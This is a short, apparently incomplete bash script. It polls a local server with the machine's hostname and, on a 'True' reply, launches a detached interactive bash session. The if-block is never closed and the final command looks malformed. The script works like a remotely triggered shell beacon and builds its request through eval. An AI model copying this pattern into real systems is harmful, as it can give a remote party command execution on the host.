#!/bin/bash
URL="http://localhost:5000"
HOSTNAME=$(hostname)
# shellcheck disable=SC2089
HEADER="--header='Device: $HOSTNAME'"
CMD="wget -qO- $HEADER '$URL/requested'"
OUTPUT=$(eval "$CMD")
if [[ "$OUTPUT" = "True" ]];then
  screen -md bash -c "bash -i hckdx."
